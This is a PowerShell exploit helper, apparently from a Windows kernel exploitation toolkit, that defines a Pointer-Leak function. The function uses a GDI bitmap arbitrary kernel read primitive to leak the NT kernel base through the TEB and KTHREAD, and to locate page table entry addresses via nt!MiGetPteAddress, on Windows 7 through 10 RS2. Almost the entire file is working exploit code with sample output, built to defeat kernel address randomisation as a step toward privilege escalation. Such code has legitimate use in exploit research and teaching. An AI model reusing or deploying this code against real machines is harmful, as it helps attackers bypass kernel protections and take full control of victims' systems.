function Pointer-Leak {
<#
.SYNOPSIS
	Pointer-Leak is a wrapper for various types of pointer leaks, more will be added over time.

	Methods:
		+ NT kernel base leak through the TEB (by @Blomster81)
		Properties => Requires Bitmap primitive & LowIL compatible
		Targets => 7, 8, 8.1, 10, 10RS1, 10RS2
	
		+ PTE leak through nt!MiGetPteAddress (by @Blomster81 & @FuzzySec)
		Properties => RS1+ requires Bitmap primitive, NT Kernel base & LowIL compatible
		Targets => 7, 8, 8.1, 10, 10RS1, 10RS2

.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.EXAMPLE
	PS C:\Users\b33f> Pointer-Leak -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandle -Type TebNtBase

	KTHREAD   : -35184359294848
	TEBBase   : 140699435483136
	NtPointer : -8787002226668
	NtBase    : -8787003412480

.EXAMPLE
	PS C:\Users\b33f> Pointer-Leak -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandle -NtBase $NTLeak.NtBase -VirtualAddress 0xFFFFF78000000800 -Type MiGetPteAddress

	PTEBase    : -10445360463872
	PTEAddress : -9913858260992
#>
	param(
		[Parameter(Mandatory = $True)]
		[ValidateSet(
			'TebNtBase',
			'MiGetPteAddress')
		]
		[String]$Type,
		[Parameter(Mandatory = $False)]
		[IntPtr]$ManagerBitmap,
		[Parameter(Mandatory = $False)]
		[IntPtr]$WorkerBitmap,
		[Parameter(Mandatory = $False)]
		[IntPtr]$NtBase,
		[Parameter(Mandatory = $False)]
		$VirtualAddress
	)

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	[StructLayout(LayoutKind.Sequential)]
	public struct _THREAD_BASIC_INFORMATION
	{
		public IntPtr ExitStatus;
		public IntPtr TebBaseAddress;
		public IntPtr ClientId;
		public IntPtr AffinityMask;
		public IntPtr Priority;
		public IntPtr BasePriority;
	}

	public static class PtrLeak
	{
		[DllImport("gdi32.dll")]
		public static extern int SetBitmapBits(
			IntPtr hbmp,
			uint cBytes,
			byte[] lpBits);
		[DllImport("gdi32.dll")]
		public static extern int GetBitmapBits(
			IntPtr hbmp,
			int cbBuffer,
			IntPtr lpvBits);
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr VirtualAlloc(
			IntPtr lpAddress,
			uint dwSize,
			UInt32 flAllocationType,
			UInt32 flProtect);
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool VirtualFree(
			IntPtr lpAddress,
			uint dwSize,
			uint dwFreeType);
		[DllImport("ntdll.dll")]
		public static extern int NtQueryInformationThread(
			IntPtr hThread, 
			int ThreadInfoClass,
			ref _THREAD_BASIC_INFORMATION ThreadInfo,
			int ThreadInfoLength,
			ref int ReturnLength);
		[DllImport("kernel32.dll")]
		public static extern IntPtr GetCurrentThread();
		[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
		public static extern IntPtr LoadLibrary(
			string lpFileName);
		[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
		public static extern IntPtr GetProcAddress(
			IntPtr hModule,
			string procName);
		[DllImport("ntdll.dll")]
		public static extern uint NtQueryIntervalProfile(
			UInt32 ProfileSource,
			ref UInt32 Interval);
		public static long And(long x, long y) {return x & y;}
		public static long Right(long x, int y) {return x >> y;}
	}
"@

	# Only 64-bit
	if ([System.IntPtr]::Size -eq 4) {
		Throw "`n[!] Only 64-bit is supported`n"
	}

	# Extended validation of params because using
	# dynamic param sets is a pita + OS version
	# checking required
	if ($Type -eq "TebNtBase") {
		if (!$ManagerBitmap -Or !$WorkerBitmap) {
			Throw "`$ManagerBitmap,`$WorkerBitmap are required"
		}
	} else {
		$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
		$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
		if ($OSMajorMinor -eq "10.0" -And $OSVersion.Build -ge 14393) {
			if (!$ManagerBitmap -Or !$WorkerBitmap -Or !$NtBase -Or !$VirtualAddress) {
				Throw "`$ManagerBitmap,`$WorkerBitmap,`$NtBase,`$VirtualAddress are required"
			}
		} else {
			if (!$VirtualAddress) {
				Throw "`$VirtualAddress is required"
			}
		}
	}

	# Arbitrary Kernel read
	function Bitmap-Read {
		param ($Address)
		$CallResult = [PtrLeak]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
		[IntPtr]$Pointer = [PtrLeak]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
		$CallResult = [PtrLeak]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer)
		[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
		$CallResult = [PtrLeak]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
	}

	# Search back for module base
	function Look-Behind {
		param($PtrLeak)
		$MZ = 0x905a4d # MZ header
		$Seek = [PtrLeak]::And($PtrLeak,0xFFFFFFFFFFFFF000)
		while($true) {
			$IntPtrRead = Bitmap-Read -Address $Seek
			$PtrVal = [PtrLeak]::And($IntPtrRead,0xFFFFFF)
			if ($PtrVal -eq $MZ) {
				break
			}
			$Seek = $Seek - 0x1000
		}
		$Seek
	}

	if ($Type -eq "TebNtBase") {
		$CurrentHandle = [PtrLeak]::GetCurrentThread()
		$THREAD_BASIC_INFORMATION = New-Object _THREAD_BASIC_INFORMATION
		$THREAD_BASIC_INFORMATION_SIZE = [System.Runtime.InteropServices.Marshal]::SizeOf($THREAD_BASIC_INFORMATION)
		$RetLen = New-Object Int
		$CallResult = [PtrLeak]::NtQueryInformationThread($CurrentHandle,0,[ref]$THREAD_BASIC_INFORMATION,$THREAD_BASIC_INFORMATION_SIZE,[ref]$RetLen)
		$TEBBase = $THREAD_BASIC_INFORMATION.TebBaseAddress
		$Win32ThreadInfo = Bitmap-Read -Address $([Int64]$TEBBase+0x78)
		$KTHREAD = Bitmap-Read -Address $Win32ThreadInfo
		$NtPtr = Bitmap-Read -Address $($KTHREAD+0x2a8)
		$NtBase = Look-Behind -PtrLeak $NtPtr

		$HashTable = @{
			TEBBase = $TEBBase
			KTHREAD = $KTHREAD
			NtPointer = $NtPtr
			NtBase = $NtBase
		}
		New-Object PSObject -Property $HashTable
	}

	if ($Type -eq "MiGetPteAddress") {
		if ($OSMajorMinor -eq "10.0" -And $OSVersion.Build -ge 14393) {
			$KernelHanle = [PtrLeak]::LoadLibrary($($Env:SystemRoot + "\System32\ntoskrnl.exe"))
			$ProcAddr = [PtrLeak]::GetProcAddress($KernelHanle, "MmFreeNonCachedMemory")
			$MmFreeNonCachedMemory = $ProcAddr.ToInt64() - $KernelHanle + $NtBase
			for ($i=0;$i-lt100;$i++) {
				$val = ("{0:X}" -f $(Bitmap-Read -Address $($MmFreeNonCachedMemory + $i))) -split '(..)' | ? { $_ }
				if ($val[-1] -eq "E8") {
					$Offset = $MmFreeNonCachedMemory + $i
					$OffsetQWORD = Bitmap-Read -Address $Offset
					$Distance = [Int]"0x$($(("{0:X}" -f $OffsetQWORD) -split '(..)' | ? { $_ })[-5,-4,-3,-2] -join '')" # A riddle wrapped in a mystery..
					$MiGetPteAddress = $Offset + $Distance + 5
					break
				}
			}
			$PTEBase = Bitmap-Read -Address $($MiGetPteAddress + 0x13)
		} else {
			$PTEBase = 0xFFFFF68000000000
		}

		$VirtualAddress = [PtrLeak]::Right($VirtualAddress,9)
		$VirtualAddress = [PtrLeak]::And($VirtualAddress,0x7FFFFFFFF8)
		$PTEAddress = $VirtualAddress + $PTEBase

		$HashTable = @{
			PTEBase = $PTEBase
			PTEAddress = $PTEAddress
		}
		New-Object PSObject -Property $HashTable
	}
}